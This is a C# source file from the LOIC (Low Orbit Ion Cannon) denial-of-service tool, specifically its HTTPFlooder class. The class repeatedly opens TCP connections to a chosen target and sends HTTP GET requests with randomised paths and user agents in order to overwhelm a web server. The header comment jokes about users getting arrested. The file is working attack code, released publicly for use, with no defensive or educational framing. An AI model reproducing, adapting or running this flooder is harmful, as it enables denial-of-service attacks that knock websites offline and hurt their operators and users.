/* LOIC - Low Orbit Ion Cannon
 * Released to the public domain
 * Enjoy getting v&, kids.
 */

using System;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;

namespace LOIC
{
	public class HTTPFlooder : IFlooder
	{
		public bool IsFlooding { get; set; }
		public int Delay       { get; set; }

		public ReqState State = ReqState.Ready;
		public int Downloaded;
		public int Requested;
		public int Failed;

		private BackgroundWorker bw;
		private Timer tTimepoll;
		private bool intShowStats;
		private long lastAction;

		private readonly string Host;
		private readonly string IP;
		private readonly int Port;
		private readonly string Subsite;
		private readonly int Timeout;
		private readonly bool Resp;
		private readonly bool AllowRandom;
		private readonly bool AllowGzip;

		public HTTPFlooder(string host, string ip, int port, string subSite, bool resp, int delay, int timeout, bool random, bool gzip)
		{
			this.Host = host;
			this.IP = ip;
			this.Port = port;
			this.Subsite = subSite;
			this.Resp = resp;
			this.Delay = delay;
			this.Timeout = timeout;
			this.AllowRandom = random;
			this.AllowGzip = gzip;
		}
		public void Start()
		{
			this.IsFlooding = true;

			lastAction = Tick();
			tTimepoll = new Timer();
			tTimepoll.Tick += tTimepoll_Tick;
			tTimepoll.Start();

			this.bw = new BackgroundWorker();
			this.bw.DoWork += bw_DoWork;
			this.bw.RunWorkerAsync();
			this.bw.WorkerSupportsCancellation = true;
		}
		public void Stop()
		{
			this.IsFlooding = false;
			this.bw.CancelAsync();
		}
		void tTimepoll_Tick(object sender, EventArgs e)
		{
			if(intShowStats) return; intShowStats = true;

			if(Tick() > lastAction + Timeout)
			{
				Failed++; State = ReqState.Failed;
				tTimepoll.Stop();
				if(this.IsFlooding)
					tTimepoll.Start();
			}

			intShowStats = false;
		}
		private void bw_DoWork(object sender, DoWorkEventArgs e)
		{
			try
			{
				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
				while (this.IsFlooding)
				{
					State = ReqState.Ready; // SET STATE TO READY //
					lastAction = Tick();
					byte[] recvBuf = new byte[128];
					using (Socket socket = new Socket(RHost.AddressFamily, SocketType.Stream, ProtocolType.Tcp))
					{
						socket.NoDelay = true;
						State = ReqState.Connecting; // SET STATE TO CONNECTING //

						try { socket.Connect(RHost); }
						catch(SocketException) { goto _continue; }

						byte[] buf = Encoding.ASCII.GetBytes(String.Format("GET {0}{1} HTTP/1.1{5}Host: {3}{5}User-Agent: {2}{5}Accept: */*{5}{4}{5}{5}", Subsite, (AllowRandom ? Functions.RandomString() : ""), Functions.RandomUserAgent(), Host, (AllowGzip ? "Accept-Encoding: gzip, deflate" + Environment.NewLine : ""), Environment.NewLine));

						socket.Blocking = Resp;
						State = ReqState.Requesting; // SET STATE TO REQUESTING //

						try { socket.Send(buf, SocketFlags.None); }
						catch(SocketException) { goto _continue; }

						State = ReqState.Downloading; Requested++; // SET STATE TO DOWNLOADING // REQUESTED++

						if (Resp)
							socket.Receive(recvBuf, recvBuf.Length, SocketFlags.None);
					}
					State = ReqState.Completed; Downloaded++; // SET STATE TO COMPLETED // DOWNLOADED++
					tTimepoll.Stop();
					tTimepoll.Start();
_continue:
					if(Delay >= 0)
						System.Threading.Thread.Sleep(Delay+1);
				}
			}
			// Analysis disable once EmptyGeneralCatchClause
			catch { }
			finally { tTimepoll.Stop(); State = ReqState.Ready; this.IsFlooding = false; }
		}
		private static long Tick()
		{
			return DateTime.Now.Ticks / 10000;
		}
	}
}